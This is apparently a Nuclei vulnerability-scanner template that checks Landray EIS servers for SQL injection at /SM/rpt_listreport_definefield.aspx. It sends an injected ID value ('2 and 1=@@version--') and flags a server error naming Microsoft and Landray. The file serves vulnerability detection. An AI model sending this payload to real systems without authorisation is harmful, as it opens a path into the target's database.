id: landray-eis-rptlistreport-definefield-sqli

info:
  name: landray-eis-rptlistreport-definefield-sqli
  author: msk
  severity: high

http:
  - raw:
      - |
        GET /SM/rpt_listreport_definefield.aspx?ID=2%20and%201=@@version--+ HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
        Accept-Encoding: gzip, deflate
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
        Connection: close
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Upgrade-Insecure-Requests: 1

    matchers:
      - type: dsl
        dsl:
          - 'status_code==500 && contains_all(body,"Microsoft","Landray")'